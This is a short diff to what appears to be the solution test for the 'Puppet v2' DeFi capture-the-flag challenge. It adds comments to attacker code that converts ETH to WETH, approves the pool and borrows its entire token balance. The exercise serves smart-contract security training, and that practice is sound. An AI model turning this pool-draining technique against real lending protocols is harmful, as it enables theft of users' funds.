@@ -120,13 +120,18 @@ describe('[Challenge] Puppet v2', function () {
         console.log("");
         console.log("WETH required to get all tokens in pool:", ethers.utils.formatEther(wethRequired));
         
+        //swap amount of ETH for needed WETH
         const attackerWeth = await attackWeth.balanceOf(attacker.address)
         const ethToSwap = ((wethRequired - attackerWeth)/10**18).toString();
         console.log("ETH required to to swap for WETH:", ethToSwap);
         await attackWeth.deposit({value: ethers.utils.parseEther(ethToSwap)});
         console.log("Eth swapped for WETH");
+
+        //approve pools spending of required WETH
         await attackWeth.approve(attackPool.address, wethRequired);
         console.log("Pool approved for spending WETH");
+
+        //borrow funds
         await attackPool.borrow(POOL_INITIAL_TOKEN_BALANCE,{gasLimit: 1e6});
         console.log("Borrow Transaction Completed");
         
